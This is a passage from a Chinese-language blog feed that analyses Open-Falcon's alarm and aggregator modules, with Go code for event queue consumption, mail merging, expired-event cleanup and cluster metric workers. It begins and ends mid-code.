cron.CombineMail()</span><br><span class="line"><span class="keyword">go</span> cron.CombineIM()</span><br><span class="line">    <span class="comment">// 发送邮件功能</span></span><br><span class="line"><span class="keyword">go</span> cron.ConsumeIM()</span><br><span class="line"><span class="keyword">go</span> cron.ConsumeSms()</span><br><span class="line"><span class="keyword">go</span> cron.ConsumeMail()</span><br><span class="line">    <span class="comment">// 清理过期事件</span></span><br><span class="line"><span class="keyword">go</span> cron.CleanExpiredEvent()</span><br><span class="line"></span><br><span class="line">sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-sigs</span><br><span class="line">fmt.Println()</span><br><span class="line">g.RedisConnPool.Close()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事件读取任务以highevent为例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadHighEvent</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 获取优先级高的队列</span></span><br><span class="line">queues := g.Config().Redis.HighQueues</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(queues) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">//  出队</span></span><br><span class="line">event, err := popEvent(queues)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 消费队列</span></span><br><span class="line">consume(event, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consume</span><span class="params">(event *cmodel.Event, isHigh <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">actionId := event.ActionId()</span><br><span class="line"><span class="keyword">if</span> actionId &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">action := api.GetAction(actionId)</span><br><span class="line"><span class="keyword">if</span> action == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> action.Callback == <span class="number">1</span> &#123;</span><br><span class="line">HandleCallback(event, action)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isHigh &#123;</span><br><span class="line">consumeHighEvents(event, action)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">consumeLowEvents(event, action)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>consumeHighEvents函数最终会调用WriteMaiModel函数最终写入到redis队列中去：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WriteMailModel</span><span class="params">(mail *model.Mail)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> mail == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bs, err := json.Marshal(mail)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Debugf(<span class="string">"write mail to queue, mail:%v, queue:%s"</span>, mail, MAIL_QUEUE_NAME)</span><br><span class="line">lpush(MAIL_QUEUE_NAME, <span class="keyword">string</span>(bs))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">combineMail</span><span class="params">()</span></span> &#123;</span><br><span class="line">dtos := popAllMailDto()</span><br><span class="line">count := <span class="built_in">len</span>(dtos)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dtoMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]*MailDto)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">key := fmt.Sprintf(<span class="string">"%d%s%s%s"</span>, dtos[i].Priority, dtos[i].Status, dtos[i].Email, dtos[i].Metric)</span><br><span class="line"><span class="keyword">if</span> _, ok := dtoMap[key]; ok &#123;</span><br><span class="line">dtoMap[key] = <span class="built_in">append</span>(dtoMap[key], dtos[i])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dtoMap[key] = []*MailDto&#123;dtos[i]&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不要在这处理，继续写回redis，否则重启alarm很容易丢数据</span></span><br><span class="line"><span class="keyword">for</span> _, arr := <span class="keyword">range</span> dtoMap &#123;</span><br><span class="line">size := <span class="built_in">len</span>(arr)</span><br><span class="line"><span class="keyword">if</span> size == <span class="number">1</span> &#123;</span><br><span class="line">redi.WriteMail([]<span class="keyword">string</span>&#123;arr[<span class="number">0</span>].Email&#125;, arr[<span class="number">0</span>].Subject, arr[<span class="number">0</span>].Content)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">subject := fmt.Sprintf(<span class="string">"[P%d][%s] %d %s"</span>, arr[<span class="number">0</span>].Priority, arr[<span class="number">0</span>].Status, size, arr[<span class="number">0</span>].Metric)</span><br><span class="line">contentArr := <span class="built_in">make</span>([]<span class="keyword">string</span>, size)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">contentArr[i] = arr[i].Content</span><br><span class="line">&#125;</span><br><span class="line">content := strings.Join(contentArr, <span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">log.Debugf(<span class="string">"combined mail subject:%s, content:%s"</span>, subject, content)</span><br><span class="line">redi.WriteMail([]<span class="keyword">string</span>&#123;arr[<span class="number">0</span>].Email&#125;, subject, content)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置以天为单位的过期删除事件，数据库中删除。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CleanExpiredEvent</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"></span><br><span class="line">retention_days := g.Config().Housekeeper.EventRetentionDays</span><br><span class="line">delete_batch := g.Config().Housekeeper.EventDeleteBatch</span><br><span class="line"></span><br><span class="line">now := time.Now()</span><br><span class="line">before := now.Add(time.Duration(-retention_days*<span class="number">24</span>) * time.Hour)</span><br><span class="line">eventmodel.DeleteEventOlder(before, delete_batch)</span><br><span class="line"></span><br><span class="line">time.Sleep(time.Second * <span class="number">60</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-alarm-源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-alarm-源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon alarm 源码分析&quot;&gt;&lt;/a&gt;open-falcon alarm 源码
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon aggregator源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/aggregator%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/aggregator%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:42.242Z</published>
    <updated>2020-01-21T09:03:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-aggregator源码分析"><a href="#open-falcon-aggregator源码分析" class="headerlink" title="open-falcon aggregator源码分析"></a>open-falcon aggregator源码分析</h2><p> 主流程module/aggregator/main中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">help := flag.Bool(<span class="string">"h"</span>, <span class="literal">false</span>, <span class="string">"help"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">flag.Usage()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 配置文件解析</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line">    <span class="comment">// 数据库初始化</span></span><br><span class="line">db.Init()</span><br><span class="line"><span class="comment">// http服务启动，接口查询所有的cluster信息</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">//定时更新cluster数据，并启动worker启动，用于计算平均指标数据</span></span><br><span class="line"><span class="keyword">go</span> cron.UpdateItems()</span><br><span class="line"></span><br><span class="line"><span class="comment">// sdk configuration</span></span><br><span class="line">sender.Debug = g.Config().Debug</span><br><span class="line">sender.PostPushUrl = g.Config().Api.PushApi</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据推送</span></span><br><span class="line">sender.StartSender()</span><br><span class="line"></span><br><span class="line">sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-sigs</span><br><span class="line">fmt.Println()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要功能在UpdateItems函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateItems</span><span class="params">()</span></span> &#123;</span><br><span class="line">items, err := db.ReadClusterMonitorItems()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">deleteNoUseWorker(items)</span><br><span class="line">createWorkerIfNeed(items)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先查询数据库ReadClusterMonitorItems，获取已经在监控中的集群信息。，然后删除没有用到的集群信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteNoUseWorker</span><span class="params">(m <span class="keyword">map</span>[<span class="keyword">string</span>]*g.Cluster)</span></span> &#123;</span><br><span class="line">del := []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> key, worker := <span class="keyword">range</span> Workers &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := m[key]; !ok &#123;</span><br><span class="line">worker.Drop()</span><br><span class="line">del = <span class="built_in">append</span>(del, key)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, key := <span class="keyword">range</span> del &#123;</span><br><span class="line"><span class="built_in">delete</span>(Workers, key)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果还没有监控则创建worker任务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createWorkerIfNeed</span><span class="params">(m <span class="keyword">map</span>[<span class="keyword">string</span>]*g.Cluster)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> key, item := <span class="keyword">range</span> m &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := Workers[key]; !ok &#123;</span><br><span class="line"><span class="keyword">if</span> item.Step &lt;= <span class="number">0</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[W] invalid cluster(step &lt;= 0):"</span>, item)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">worker := NewWorker(item)</span><br><span class="line">Workers[key] = worker</span><br><span class="line">worker.Start() <span class="comment">// 启动</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this Worker)</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s1 := rand.NewSource(time.Now().UnixNano() * this.ClusterItem.Id)</span><br><span class="line">r1 := rand.New(s1)</span><br><span class="line"><span class="comment">// 60s, step usually</span></span><br><span class="line">delay := r1.Int63n(<span class="number">60000</span>)</span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[I] after %5d ms, start worker %d"</span>, delay, this.ClusterItem.Id)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time.Sleep(time.Duration(delay) * time.Millisecond)</span><br><span class="line">this.Ticker = time.NewTicker(time.Duration(this.ClusterItem.Step) * time.Second)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-this.Ticker.C:</span><br><span class="line">WorkerRun(this.ClusterItem)</span><br><span class="line"><span class="keyword">case</span> &lt;-this.Quit:</span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">log.Println(<span class="string">"[I] drop worker"</span>, this.ClusterItem)</span><br><span class="line">&#125;</span><br><span class="line">this.Ticker.Stop()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置定时器执行函数WorkerRun</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WorkerRun</span><span class="params">(item *g.Cluster)</span></span> &#123;</span><br><span class="line">debug := g.Config().Debug</span><br><span class="line"></span><br><span class="line">numeratorStr := cleanParam(item.Numerator)        <span class="comment">//</span></span><br><span class="line">denominatorStr := cleanParam(item.Denominator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !expressionValid(numeratorStr) || !expressionValid(denominatorStr) &#123;</span><br><span class="line">log.Println(<span class="string">"[W] invalid numerator or denominator"</span>, item)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 判断包含$(需要解析</span></span><br><span class="line">needComputeNumerator := needCompute(numeratorStr)</span><br><span class="line">needComputeDenominator := needCompute(denominatorStr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !needComputeNumerator &amp;&amp; !needComputeDenominator &#123;</span><br><span class="line">log.Println(<span class="string">"[W] no need compute"</span>, item)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析算子</span></span><br><span class="line">numeratorOperands, numeratorOperators, numeratorComputeMode := parse(numeratorStr, needComputeNumerator)</span><br><span class="line">denominatorOperands, denominatorOperators, denominatorComputeMode := parse(denominatorStr, needComputeDenominator)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 操作非法</span></span><br><span class="line"><span class="keyword">if</span> !operatorsValid(numeratorOperators) || !operatorsValid(denominatorOperators) &#123;</span><br><span class="line">log.Println(<span class="string">"[W] operators invalid"</span>, item)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 根据id获取hostname</span></span><br><span class="line">hostnames, err := sdk.HostnamesByID(item.GroupId)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || <span class="built_in">len</span>(hostnames) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"><span class="comment">// 获取最新的数据点</span></span><br><span class="line">valueMap, err := queryCounterLast(numeratorOperands, denominatorOperands, hostnames, now-<span class="keyword">int64</span>(item.Step*<span class="number">2</span>), now)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[E]"</span>, err, item)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> numerator, denominator <span class="keyword">float64</span></span><br><span class="line"><span class="keyword">var</span> validCount <span class="keyword">int</span></span><br><span class="line"><span class="comment">// 每个机器计算</span></span><br><span class="line"><span class="keyword">for</span> _, hostname := <span class="keyword">range</span> hostnames &#123;</span><br><span class="line"><span class="keyword">var</span> numeratorVal, denominatorVal <span class="keyword">float64</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="comment">// 需要计算分子</span></span><br><span class="line"><span class="keyword">if</span> needComputeNumerator &#123;</span><br><span class="line">numeratorVal, err = compute(numeratorOperands, numeratorOperators, numeratorComputeMode, hostname, valueMap)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &amp;&amp; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[W] [hostname:%s] [numerator:%s] id:%d, err:%v"</span>, hostname, item.Numerator, item.Id, err)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[D] [hostname:%s] [numerator:%s] id:%d, value:%0.4f"</span>, hostname, item.Numerator, item.Id, numeratorVal)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 需要计算分母</span></span><br><span class="line"><span class="keyword">if</span> needComputeDenominator &#123;</span><br><span class="line">denominatorVal, err = compute(denominatorOperands, denominatorOperators, denominatorComputeMode, hostname, valueMap)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &amp;&amp; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[W] [hostname:%s] [denominator:%s] id:%d, err:%v"</span>, hostname, item.Denominator, item.Id, err)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[D] [hostname:%s] [denominator:%s] id:%d, value:%0.4f"</span>, hostname, item.Denominator, item.Id, denominatorVal)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[D] hostname:%s  numerator:%0.4f  denominator:%0.4f  per:%0.4f\n"</span>, hostname, numeratorVal, denominatorVal, numeratorVal/denominatorVal)</span><br><span class="line">&#125;</span><br><span class="line">numerator += numeratorVal</span><br><span class="line">denominator += denominatorVal</span><br><span class="line">validCount += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不需要要计算分子</span></span><br><span class="line"><span class="keyword">if</span> !needComputeNumerator &#123;</span><br><span class="line"><span class="keyword">if</span> numeratorStr == <span class="string">"$#"</span> &#123;</span><br><span class="line">numerator = <span class="keyword">float64</span>(validCount)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">numerator, err = strconv.ParseFloat(numeratorStr, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[E] strconv.ParseFloat(%s) fail %v, id:%d"</span>, numeratorStr, err, item.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不需要计算分母</span></span><br><span class="line"><span class="keyword">if</span> !needComputeDenominator &#123;</span><br><span class="line"><span class="keyword">if</span> denominatorStr == <span class="string">"$#"</span> &#123;</span><br><span class="line">denominator = <span class="keyword">float64</span>(validCount)</span><br><span class="line">&#125; <span 